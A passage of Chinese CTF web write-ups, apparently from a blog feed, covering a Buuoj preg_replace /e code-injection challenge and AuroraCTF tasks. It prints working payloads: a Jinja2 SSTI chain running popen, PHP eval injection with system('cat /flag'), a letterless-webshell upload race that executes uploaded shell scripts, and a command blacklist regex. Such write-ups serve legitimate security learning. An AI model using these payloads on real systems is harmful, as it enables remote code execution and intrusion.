xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>e</mi><mtext>，然后将</mtext></mrow><annotation encoding="application/x-tex">re，然后将</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">将</span></span></span></span>str的值替换进<font color="blue">strtolower(“\\1”)</font></p><p>也就相当于是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>也就是说我们需要传入一个正则表达式，以及一个需要执行的命令，这个正则表达式能够匹配所有的字符</p><p>正则表达式：<font color="red">.*</font>又称为贪婪模式，可以匹配到所有的字符</p><p>但是url中不能够使用 <strong>.</strong>  会被php读取成下划线</p><p>所以我们可以使用另外一个正则表达式：<font color="red">\S*</font></p><p>这个正则表达式可以匹配任何非空字符，等价于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^ \f\n\r\t\v]</span><br></pre></td></tr></table></figure><p>然后我们传入的命令需要调用getFlag函数，执行eval函数：</p><p>所以写成${getFlag()}，而eval函数直接执行get传参cmd传入的命令</p><p>所以cmd=system(‘cat /flag’);</p><p>但是由于这段代码是在next.php内的，所以我们需要进入next.php并且执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">url/next.php?\S*=$&#123;<span class="title function_ invoke__">getflag</span>()&#125;&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/14.png" class title="获得flag"><hr><p>未完待续捏</p><hr><p>参考资料：</p><ul><li><a href="https://rv7hz6lwkh.feishu.cn/docx/CCTbdiq6kohN2hxP2DCcZbW6n9g">我的飞书云文档</a></li><li><a href="http://t.csdn.cn/BeXM5">The mystery of ip</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;做做buuoj上的web题，本萌新纯采集，轻喷（（（&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web WriteUp" scheme="http://example.com/categories/CTF-Web-WriteUp/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>AuroraCTF Write Up</title>
    <link href="http://example.com/2022/12/03/AuroraCTF-Write-Up/"/>
    <id>http://example.com/2022/12/03/AuroraCTF-Write-Up/</id>
    <published>2022-12-03T13:10:01.000Z</published>
    <updated>2023-03-12T09:43:56.836Z</updated>
    
    <content type="html"><![CDATA[<p>本萌新第二次参加的比赛，毕竟是新生赛，各位师傅都很手下留情了qwq。</p><p>我主要做web方向，也做一点简单的Misc和Crypto方向的题，反正就是不看提示和百度基本上做不出来的那种qwq</p><span id="more"></span><h2><span id="what-is-ctf"> What is CTF(((</span></h2><p>简单说找flag交上去能拿到分，分越高越好（</p><p>好像说了跟没说一样</p><p>其形式有解题赛、攻防赛、混合赛等</p><p>大致流程为参赛队伍通过攻防对抗，程序分析等形式获得提供环境的一串flag 将其交给主办方…</p><p>嗯，大致又分成五个方向：Web、Reverse、Pwn、Misc、Crypto(logy)</p><p>其实可能还有BlockChain(</p><p>嗯，大概就这样</p><p>Web: 呃呃呃，就是处理用户到网站之间的各种安全事件（ 写后门，内网渗透日穿内网巴拉巴拉（（</p><p>Crypto：密码学~</p><p>Reverse：逆向工程，破解程序获得源代码，从而<s>写外挂（并不）</s></p><p>Pwn：漏洞挖掘提权（来源于俚语：攻破设备或系统</p><p>反正本采集完全不会pwn…</p><p>Misc：顾名思义，即为杂项，包含图片或者音频隐写、wireshark的流量分析、一些密码的破译等等等等，甚至能够在Misc里玩到音游，学会Misc，你就能成为全栈爷（雾）</p><p>雾</p><h2><span id="web"> Web</span></h2><h3><span id="soeasyssti"> soeasyssti</span></h3><p>无过滤的ssti jinjia2模板注入，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">137</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat flag&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><p>获得flag</p><p><strong>Aurora{wu_wu_Just_@_Fl@sk_Test!}</strong></p><h3><span id="刻猫猫"> 刻猫猫</span></h3><p>F12打开获得传参点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">        <span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;keqingcat&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">&#x27;wife&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        --&gt;</span><br></pre></td></tr></table></figure><p>所以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keqingcat=wife</span><br></pre></td></tr></table></figure><p><strong>wifestring(33) “Aurora{GensheN_1s_v3ry_fantastiC}”</strong></p><h3><span id="原神32"> 原神3.2</span></h3><p>这里其实是我先用dirsearch扫了一遍发现的www.zip</p><p>然后下载下来解压会发现source.js</p><p>是一串jsfuck代码，需要使用提供的网站解码（我也不知道为什么，反正我自己找的是解不出来</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())</span><br><span class="line"></span><br><span class="line">wanna_@n_professional_w3aPon&#125;</span><br></pre></td></tr></table></figure><p>打开F12，发现secret.php</p><p>点进去发现title处就是flag的前半段</p><p>组合一下就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Tha1_wanna_@n_professional_w3aPon&#125;</span><br></pre></td></tr></table></figure><p><s>是不是因为没有抽到专武…？</s></p><h3><span id="easyrce"> easyrce</span></h3><p>CTFShow红包题第二弹复刻（雾）</p><p>get传参，只能使用p和.+`等</p><p>嗯，那就差不多了</p><p>构造PostPoc</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://3899e1fa-85bc-4e1b-8f15-5b2e2d551651.actf-node.szu.moe/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--poc无字母webshell上传，get传参值: ?&gt;&lt;?=`.+/???/????????[@-[]`;?&gt;</span></span><br><span class="line"><span class="comment">    解释：反引号，点号可以执行sh命令，形成条件竞争 上传的文件会保存到/tmp/php?????? 后面的?是随机生成的大小写</span></span><br><span class="line"><span class="comment">    使用@-[ (ASCII码匹配的大写)可以匹配到该文件</span></span><br><span class="line"><span class="comment">    使用burp抓包，修改Content-Type: multipart/form-data;</span></span><br><span class="line"><span class="comment">    内容: #!/bin/sh</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">            要执行的命令 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--poc--&gt;</span></span><br></pre></td></tr></table></figure><p>网页处传参</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.+/??p/p?p??????`;<span class="meta">?&gt;</span></span><br><span class="line">然后POST包：</span><br><span class="line">    <span class="comment">#!/bin/sh</span></span><br><span class="line">    ls /</span><br></pre></td></tr></table></figure><p>回显fl3g.txt</p><p>直接cat即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">cat /fl3g.txt</span><br></pre></td></tr></table></figure><p><strong>AURORA{0h_n1c3!}</strong></p><h3><span id="easyinclude"> easyinclude</span></h3><p>putenv函数将环境从bin更改，调用函数的时候需要添加绝对路径</p><p>如 ls --&gt; /bin/ls</p><p>die码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;lzx found you!!!!!&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare</span></span><br><span class="line"><span class="string">  |dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local</span></span><br><span class="line"><span class="string">  |logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap</span></span><br><span class="line"><span class="string">  |type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;lzx says you are so vegetable!!!&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Well! Now run the command to get flag!&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/leran/linux/command&#x27;</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span 